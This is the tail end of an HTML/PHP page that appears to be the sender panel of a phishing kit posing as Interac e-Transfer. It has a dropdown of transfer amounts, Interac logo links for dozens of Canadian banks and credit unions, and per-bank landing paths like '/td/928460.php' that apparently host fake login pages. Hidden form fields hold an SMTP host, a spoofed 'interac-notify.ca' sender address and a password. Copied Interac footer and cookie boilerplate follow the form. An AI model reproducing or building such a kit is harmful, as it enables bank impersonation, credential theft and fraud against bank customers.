  <option value="2710.00">2,710.00</option>
  <option value="2720.00">2,720.00</option>
  <option value="2730.00">2,730.00</option>
  <option value="2740.00">2,740.00</option>
  <option value="2750.00">2,750.00</option>
  <option value="2760.00">2,760.00</option>
  <option value="2770.00">2,770.00</option>
  <option value="2780.00">2,780.00</option>
  <option value="2790.00">2,790.00</option>
  <option value="2800.00">2,800.00</option>
  <option value="2810.00">2,810.00</option>
  <option value="2820.00">2,820.00</option>
  <option value="2830.00">2,830.00</option>
  <option value="2840.00">2,840.00</option>
  <option value="2850.00">2,850.00</option>
  <option value="2860.00">2,860.00</option>
  <option value="2870.00">2,870.00</option>
  <option value="2880.00">2,880.00</option>
  <option value="2890.00">2,890.00</option>
  <option value="2900.00">2,900.00</option>
  <option value="2910.00">2,910.00</option>
  <option value="2920.00">2,920.00</option>
  <option value="2930.00">2,930.00</option>
  <option value="2940.00">2,940.00</option>
  <option value="2950.00">2,950.00</option>
  <option value="2960.00">2,960.00</option>
  <option value="2970.00">2,970.00</option>
  <option value="2980.00">2,980.00</option>
  <option value="2990.00">2,990.00</option>
  <option value="3000.00">3,000.00</option>
</select>
        <input type="hidden" name="line" value="<?php echo $line; ?>" required="">

<center>
<select name="photo_link" id="photo_href">

<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC Royal Bank

</option>
 
<option value="">--WORKING--

 </option>  

 <option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial

</option>

<option value="">------PROVINCAL------

</option>  

<option value="https://etransfer-content.interac.ca/en/logo_CA000220.png">B.C. [VANCITY]

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ALBERTA  [ATB]

</option>

<option value="">----CREDIT-U-OTHER----

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial

</option>

<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union

</option>

</select>
<select name="bank" id="bank">

<option value="RBC Royal Bank">RBC Royal Bank

</option>
 
<option value="Scotia Bank">Scotia Bank

 </option>
 
 <option value="Bank of Montreal">Bank of Montreal

 </option>
 
 <option value="CIBC">CIBC

 </option>

 
 <option value="ATB Financial">ATB Financial

 </option>
 
 <option value="TD Canada Trust">TD Canada Trust

 </option>
 
 <option value="HSBC Bank Canada">HSBC Bank Canada

 </option>
 
 <option value="National Bank of Canada">National Bank of Canada

 </option>
 
 <option value="Desjardins">Desjardins

 </option>
 
 <option value="Laurentian Bank of Canada">Laurentian Bank of Canada

 </option>
 
 <option value="Manulife Bank of Canada">Manulife Bank of Canada

 </option>
 
 <option value="Tangerine Bank">Tangerine Bank

 </option>
 
 <option value="Motus">Motusbank

 </option>
 
 <option value="Simplii Financial">Simplii Financial

 </option>
 
 <option value="Vancity">Vancity

 </option>
    
</select>
    <style>

    </style>
    <select name="photo_href" id="photo_href">
 
    <option value="/sco/928460.php">RBC Royal Bank

 </option>
 
 <option value="/sco/928460.php">Scotia Bank

 </option>
 
 <option value="/simplii/928460.php">Scotia Bank

 </option> 
 
 <option value="/bmo/928460.php">Bank of Montreal

 </option>
 
 <option value="/cibc/928460.php">CIBC

 </option>
 
 <option value="/rbc/928460.php">RBC Royal Bank

 </option>
 
 <option value="/td/928460.php">TD Canada Trust

 </option>
 
 <option value="/hsbc/928460.php">HSBC Bank Canada

 </option>
 
 <option value="/nbc/928460.php">National Bank of Canada

 </option>
 
 <option value="/desj/928460.php">Desjardins

 </option>
 
 <option value="/laur/928460.php">Laurentian Bank of Canada

 </option>
 
 <option value="/manu/928460.php">Manulife Bank of Canada

 </option>
 
 <option value="/tang/928460.php">Tangerine Bank

 </option>
 
 <option value="/equitable/928460.php">Equitable Bank

 </option>
 
 <option value="/motus/928460.php">Motusbank

 </option>
</select>

<input type="hidden" name="port" value="2525" required="">
<input type="hidden" name="username" value="etransfer@interac-notify.ca" required="">
<input type="hidden" name="password" value="E491908C41CE3BFA84FA8F67672C26B78454" required="">
<input type="hidden" name="host" value="smtp.elasticemail.com" required="">

  <input type="submit" value="Submit">

</center></form><script type="text/javascript">
				var _paq = _paq || [];
					_paq.push(['setCustomDimension', 1, '{"ID":1,"name":"admin","avatar":"5ab222bf1cea433f5a58efada161ae55"}']);
				_paq.push(['trackPageView']);
								(function () {
					var u = "https://stats1.wpmudev.com/";
					_paq.push(['setTrackerUrl', u + 'track/']);
					_paq.push(['setSiteId', '140646']);
					var d   = document, g = d.createElement('script'), s = d.getElementsByTagName('script')[0];
					g.type  = 'text/javascript';
					g.async = true;
					g.defer = true;
					g.src   = 'https://stats.wpmucdn.com/analytics####';
					s.parentNode.insertBefore(g, s);
				})();
			</script>
<div id="footer" class="footer">
  <footer class="content-info" itemscope="itemscope" itemtype="http://schema.org/WPFooter">
    <div class="grid-container copyright">
        <div class="grid-x align-justify align-middle">
          <div class="cell small-12 medium-7">
            <nav class="nav-legal" role="navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" aria-label="Interac secondary menu">
                          <ul id="menu-footer-navigation" class="nav menu"><li id="menu-item-102936" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-102936"><a href="https://www.interac.ca/en/legal/?__hstc=96842880.97cb3d9b3d8df3d60d00177688f85770.1687710411928.1687710411928.1687710411928.1&amp;__hssc=96842880.3.1687710411928&amp;__hsfp=173153910">Legal</a></li>
<li id="menu-item-64814" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-64814"><a href="https://www.interac.ca/en/accessibility/?__hstc=96842880.97cb3d9b3d8df3d60d00177688f85770.1687710411928.1687710411928.1687710411928.1&amp;__hssc=96842880.3.1687710411928&amp;__hsfp=173153910">Accessibility</a></li>
<li id="menu-item-80577" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-80577"><a href="https://www.interac.ca/en/content/?__hstc=96842880.97cb3d9b3d8df3d60d00177688f85770.1687710411928.1687710411928.1687710411928.1&amp;__hssc=96842880.3.1687710411928&amp;__hsfp=173153910">In The Know</a></li>
<li id="menu-item-64817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-64817"><a target="_blank" rel="noopener" href="https://innovation.interac.ca/?__hstc=96842880.97cb3d9b3d8df3d60d00177688f85770.1687710411928.1687710411928.1687710411928.1&amp;__hssc=96842880.3.1687710411928&amp;__hsfp=173153910">Innovation Hub</a></li>
</ul>
                        </nav>
          </div>
          <div class="cell small-12 medium-5">
            <p class="small">© Copyright 2023 Interac</p>
          </div>
          <div class="cell small-12 inlife-disclaimer">
                        <p><small><em>Interac</em> and <em>Interac</em> e-Transfer are registered trade-marks and the <em>Interac</em> logo, <em>InLife</em> and <em>InLife</em> design are trade-marks of Interac Corp.</small></p>
                    </div>
    </div>

      </div></footer>
</div>

      
			
			<div class="wt-cli-cookie-bar-container" data-nosnippet="true" style="display: block;"><!--googleoff: all--><div id="cookie-law-info-bar" role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="wt-cli-cookie-banner" data-cli-geo-loc="0" style="padding: 15px 30px; border-color: rgb(245, 245, 249); text-align: center; background-color: rgb(34, 34, 34); color: rgb(245, 245, 249); font-family: inherit; bottom: 0px; position: fixed; display: none;" class="wt-cli-cookie-bar"><div class="cli-wrapper"><span id="wt-cli-cookie-banner">We use cookies and other technologies to improve your browsing experience on our Sites, to show focused ads and to analyze Site traffic. Learn more at our <a id="wt-cli-policy-link" tabindex="0" href="https://www.interac.ca/en/cookie-policy/?__hstc=96842880.97cb3d9b3d8df3d60d00177688f85770.1687710411928.1687710411928.1687710411928.1&amp;__hssc=96842880.3.1687710411928&amp;__hsfp=173153910" style="border-color: rgb(221, 153, 51); color: rgb(221, 153, 51);" target="_blank" class="wt-cli-element wt-cli-element cli-plugin-main-link">Cookie Notice</a>.<br><a id="wt-cli-accept-btn" tabindex="0" role="button" style="margin: 5px 5px 5px 30px; border-radius: 0px; padding: 8px 25px; color: rgb(34, 34, 34); background-color: rgb(245, 245, 249);" data-cli_action="accept" class="wt-cli-element medium cli-plugin-button cli-plugin-main-button cookie_action_close_header cli_action_button">Accept</a><a id="wt-cli-settings-btn" tabindex="0" role="button" style="border-bottom: 1px solid; text-decoration: none; color: rgb(34, 34, 34); background-color: rgb(245, 245, 249);" class="wt-cli-element medium cli-plugin-button cli-plugin-main-button cli_settings_button">Manage Cookies</a></span></div></div><div tabindex="0" id="cookie-law-info-again" style="background-color: rgb(34, 34, 34); color: rgb(245, 245, 249); position: fixed; font-family: inherit; width: auto; bottom: 0px; left: 100px;"><span id="cookie_hdr_showagain">Privacy &amp; Cookies Policy</span></div><div class="cli-modal" id="cliSettingsPopup" role="dialog" aria-labelledby="wt-cli-privacy-title" tabindex="-1" aria-hidden="true">
  <div class="cli-modal-dialog" role="document">
    <div class="cli-modal-content cli-bar-popup">
      <button aria-label="Close" type="button" class="cli-modal-close" id="cliModalClose">
      <svg class="" viewBox="0 0 24 24"><path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path><path d="M0 0h24v24h-24z" fill="none"></path></svg>
      <span class="wt-cli-sr-only">Close</span>
      </button>
        <div class="cli-modal-body">

    <div class="wt-cli-element cli-container-fluid cli-tab-container">
        <div class="cli-row">
                            <div class="cli-col-12 cli-align-items-stretch cli-px-0">
                    <div class="cli-privacy-overview">
                        <h4 id="wt-cli-privacy-title">Cookie Overview</h4>                        <div class="cli-privacy-content">
                            <div class="cli-privacy-content-text">This website uses cookies and other similar technologies to allow us to collect information about you and your usage of our Sites, in order to provide you with the best user experience and the most relevant Interac products and services. Essential co...</div>
                        </div>
                        <a id="wt-cli-privacy-readmore" tabindex="0" role="button" class="cli-privacy-readmore" data-readmore-text="Show more" data-readless-text="Show less"></a>                    </div>
                </div>
                        <div class="cli-col-12 cli-align-items-stretch cli-px-0 cli-tab-section-container" role="tablist">

                
                                    <div class="cli-tab-section">
                        <div class="cli-tab-header">
                            <a id="wt-cli-tab-link-necessary" tabindex="0" role="tab" aria-expanded="false" aria-describedby="wt-cli-tab-necessary" aria-controls="wt-cli-tab-necessary" class="cli-nav-link cli-settings-mobile" data-target="necessary" data-toggle="cli-toggle-tab">
                                Essential                            </a>
                                                                                        <div class="wt-cli-necessary-checkbox">
                                    <input type="checkbox" class="cli-user-preference-checkbox" id="wt-cli-checkbox-necessary" aria-label="Essential" data-id="checkbox-necessary" checked="checked">
                                    <label class="form-check-label" for="wt-cli-checkbox-necessary"> Essential </label>
                                </div>
                                <span class="cli-necessary-caption">
                                    Always Enabled                                </span>
                                                    </div>
                        <div class="cli-tab-content">
                            <div id="wt-cli-tab-necessary" tabindex="0" role="tabpanel" aria-labelledby="wt-cli-tab-link-necessary" class="cli-tab-pane cli-fade" data-id="necessary">
                            <div class="wt-cli-cookie-description">These cookies are essential for our Sites to operate properly. Essential cookies ensure basic functionalities and security features of the Sites. These cookies do not gather personal information about you that could be used for marketing purposes.</div>
                            </div>
                        </div>
                    </div>
                                    <div class="cli-tab-section">
                        <div class="cli-tab-header">
                            <a id="wt-cli-tab-link-non-necessary" tabindex="0" role="tab" aria-expanded="false" aria-describedby="wt-cli-tab-non-necessary" aria-controls="wt-cli-tab-non-necessary" class="cli-nav-link cli-settings-mobile" data-target="non-necessary" data-toggle="cli-toggle-tab">
                                Non Essential                            </a>
                                                                                        <div class="cli-switch">
                                    <input type="checkbox" class="cli-user-preference-checkbox" id="wt-cli-checkbox-non-necessary" aria-label="non-necessary" data-id="checkbox-non-necessary" role="switch" aria-controls="wt-cli-tab-link-non-necessary" aria-labelledby="wt-cli-tab-link-non-necessary">
                                    <label for="wt-cli-checkbox-non-necessary" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">non-necessary</span></label>
                                </div>
                                                    </div>
                        <div class="cli-tab-content">
                            <div id="wt-cli-tab-non-necessary" tabindex="0" role="tabpanel" aria-labelledby="wt-cli-tab-link-non-necessary" class="cli-tab-pane cli-fade" data-id="non-necessary">
                            <div class="wt-cli-cookie-description"><strong>Reporting and Analytics</strong>
We use reporting and analytics tools to collect information about how visitors use our Sites. These technologies provide us with anonymous, aggregated data.

<strong>Advertising</strong>
We use cookies and other tracking technologies to provide you with tailored ads while you browse the internet. To do this, we might share some data with third party platforms, including but not limited to social media platforms.</div>
                            </div>
                        </div>
                    </div>
                
            </div>
        </div>
    </div>
</div>
<div class="cli-modal-footer">
    <div class="wt-cli-element cli-container-fluid cli-tab-container">
        <div class="cli-row">
            <div class="cli-col-12 cli-align-items-stretch cli-px-0">
                <div class="cli-tab-footer wt-cli-privacy-overview-actions">
                    
                        
                                                    <a id="wt-cli-privacy-save-btn" role="button" tabindex="0" data-cli-action="accept" class="wt-cli-privacy-btn cli_setting_save_button wt-cli-privacy-accept-btn cli-btn">Save &amp; Accept</a>
                                                                    
                </div>
                            </div>
        </div>
    </div>
</div>
    </div>
  </div>
</div>
<div class="cli-modal-backdrop cli-fade cli-settings-overlay"></div>
<div class="cli-modal-backdrop cli-fade cli-popupbar-overlay"></div>



<script type="text/javascript" src="https://www.interac.ca/wp-content/plugins/rate-my-post/public/js/rate-my-post####?ver=3.4.1" id="rate-my-post-js"></script>
<script type="text/javascript" src="https://www.interac.ca/wp-content/plugins/abm-locator/js/al-front-script####?ver=1.0.0" id="al-front-script-js"></script>
<script type="text/javascript" src="https://www.interac.ca/wp-content/plugins/wp-smush-pro/app/assets/js/smush-lazy-load.min####?ver=3.13.1" id="smush-lazy-load-js"></script>

<script type="text/javascript" src="https://www.interac.ca/wp-content/themes/interac-corp/dist/scripts/main_47882568####" id="sage/main####-js"></script><div id="powerTip"></div><div id="powerTip" class="" style="inset: 5393px auto auto 74px;"></div><div id="powerTip"></div>
<script type="text/javascript" src="https://www.interac.ca/wp-content/themes/interac-corp/resources/assets/scripts/components/chatbot/runtime-main.f637b11d####?ver=1" id="sage/chatbot-runtime-js"></script>

<script type="text/javascript" id="">window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date);gtag("config","DC-4168148");</script>








  






  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>


  











</div></body></html>